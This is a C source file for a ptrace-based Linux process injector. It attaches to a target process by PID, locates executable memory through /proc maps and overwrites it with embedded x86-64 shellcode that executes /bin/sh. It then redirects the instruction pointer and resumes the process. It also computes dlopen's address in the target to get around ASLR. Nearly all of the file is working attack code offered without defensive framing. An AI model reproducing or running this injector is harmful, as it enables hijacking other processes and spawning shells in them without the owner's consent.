#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

#define ONEKB 1024
//static size_t PAGE_SIZE = sysconf(_SC_PAGESIZE);


unsigned char shellcode[] = "\x90\x90\x90\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb8\x3b\x00\x00\x00\x0f\x05";


/**
 * @brief Searches memory maps for a library in a targeted 
 * processes memory or search for a library within ourself 
 * 
 * @param library - string of library to search for
 * @param pid - pid of target process, if -1, then 
 * 				search within self
 * @return unsigned long long of starting address of library on 
 * 		   success or 0 on failure
 */
unsigned long long findLibrary(const char *library, pid_t pid) {
    char mapFilename[ONEKB];
    char buffer[9076];
    FILE *fd;
    unsigned long long addr = 0;

	if (pid == -1) {
		snprintf(mapFilename, sizeof(mapFilename), "/proc/self/maps");
	} 
    else {
		snprintf(mapFilename, sizeof(mapFilename), "/proc/%d/maps", pid);
	}

	fd = fopen(mapFilename, "r");

	while(fgets(buffer, sizeof(buffer), fd)) {
		if (strstr(buffer, library)) {
			addr = strtoull(buffer, NULL, 16);
			break;
		}
	}
	fclose(fd);

	return addr;
}

long freespaceaddr(pid_t pid)
{
	FILE *fp;
	char filename[30];
	char line[850];
	long addr;
	char str[20];
	char perms[5];
	sprintf(filename, "/proc/%d/maps", pid);
	fp = fopen(filename, "r");
	if(fp == NULL)
		exit(1);
	while(fgets(line, 850, fp) != NULL)
	{
		sscanf(line, "%lx-%*x %s %*s %s %*d", &addr, perms, str);
		printf("%s\n", line);
		if(strstr(perms, "x") != NULL)
		{
			break;
		}
	}
	printf("[+] Found executable memory at %lx\n", addr);
	fclose(fp);
	return addr;
}


/**
 * @brief ptrace_read()
 *
 * Use ptrace() to read the contents of a target process' address space.
 *
 * args:
 * @param int pid: pid of the target process
 * @param unsigned long addr: the address to start reading from
 * @param void *vptr: a pointer to a buffer to read data into
 * @param int len: the amount of data to read from the target
 *
 */
void ptrace_read(int pid, unsigned long addr, void *out_ptr, int len)
{
	int bytesRead = 0;
	int i = 0;
	long word = 0;
	long *ptr = (long *)out_ptr;

	while (bytesRead < len) {
		word = ptrace(PTRACE_PEEKTEXT, pid, (addr + bytesRead), NULL);
		if(word == -1) {

			printf("ptrace(PTRACE_PEEKTEXT) failed\n");
			exit(1);
		}
		bytesRead += sizeof(word);
		ptr[i++] = word;
	}
}

/**
 * @brief ptrace_write()
 *
 * Use ptrace() to write to the target process' address space.
 *
 * args:
 * @param int pid: pid of the target process
 * @param unsigned long addr: the address to start writing to
 * @param void *vptr: a pointer to a buffer containing the data to be written to the
 *   target's address space
 * @param int len: the amount of data to write to the target
 *
 */
void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
{
	int byteCount = 0;
	long word = 0;

	while (byteCount < len)
	{
		memcpy(&word, vptr + byteCount, sizeof(word));
		word = ptrace(PTRACE_POKETEXT, pid, (addr + byteCount), word);
		if(word == -1)
		{
			printf("ptrace(PTRACE_POKETEXT) failed\n");
			exit(1);
		}
		byteCount += sizeof(word);
	}
}



int inject(pid_t pid, void* dlopen_addr, void* payload, size_t payload_len){

	struct user_regs_struct oldregs;
	struct user_regs_struct regs;
	int status;
	unsigned char *oldcode;
	
	// Clear any possible junk
	memset(&oldregs, 0, sizeof(struct user_regs_struct));
	memset(&regs, 0, sizeof(struct user_regs_struct));

	// Attach to the target process
	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	if(0 > waitpid(pid, &status, WUNTRACED)){
		printf("[-] Failure to catch SIGSTOP on target process\n");
		return EXIT_FAILURE;
	}
	printf("[+] attached to PID: %d\n", pid);

	// Store the current register values for later
	ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));


	oldcode = malloc(sizeof(shellcode)*sizeof(uint8_t));

	// find a good address to copy code to
	long addr = freespaceaddr(pid);// + sizeof(long);

	ptrace_read(pid, addr, oldcode, sizeof(shellcode));
	
	ptrace_write(pid, addr, shellcode, sizeof(shellcode));
	
	regs.rip = addr + 2;
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);

	ptrace(PTRACE_CONT, pid, NULL, NULL);
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
	//waitpid(pid, &status, WUNTRACED);
	free(oldcode);

	return EXIT_SUCCESS;
}

/**
 * 
 * 
 */
int main(int argc, char* argv[]) {
    unsigned long long target_libdl_exemem, self_libdl_exemem;
    void *dlopen_sym_addr = NULL;
    void *self_libdl_addr = NULL;

	if(argc != 2){
		printf("[-] Improper number of args...\n");
		exit(EXIT_FAILURE);
	}

	self_libdl_addr = dlopen("libdl.so", RTLD_LAZY);
	if (self_libdl_addr == NULL) {
		printf("[!] Error opening libdl.so\n");
		exit(EXIT_FAILURE);
	}
	printf("[*] libdl.so loaded at address %p\n", self_libdl_addr);

	dlopen_sym_addr = dlsym(self_libdl_addr, "dlopen");
	if (dlopen_sym_addr == NULL) {
		printf("[!] Error locating dlopen() function\n");
		exit(EXIT_FAILURE);
	}
	printf("[*] dlopen() found at address %p\n", dlopen_sym_addr);

	// Find the base address of libdl in our target process
	target_libdl_exemem = findLibrary("libdl", atoi(argv[1]));
	if(!target_libdl_exemem){
		printf("[-] Could not locate libdl in PID: %i", atoi(argv[1]));
		exit(EXIT_FAILURE);
	}
	printf("[*] libdl located in PID %d at address %p\n", atoi(argv[1]), (void*)target_libdl_exemem);

	// Find base of executable lib memory
	self_libdl_exemem = findLibrary("libdl", -1);

	/*
	 * Due to ASLR, we need to calculate the 
	 * address offset in the target process
	 */  
	dlopen_sym_addr = target_libdl_exemem + (dlopen_sym_addr - self_libdl_exemem);
	printf("[*] dlopen() offset in libdl found to be 0x%llx bytes\n", (unsigned long long)(self_libdl_addr - self_libdl_exemem));
	printf("[*] dlopen() in target process at address 0x%llx\n", (unsigned long long)dlopen_sym_addr);

    freespaceaddr(atoi(argv[1]));

	printf("size of word %ld\n", sizeof(long));
	inject(atoi(argv[1]),dlopen_sym_addr, shellcode, 12);

    return 0;
}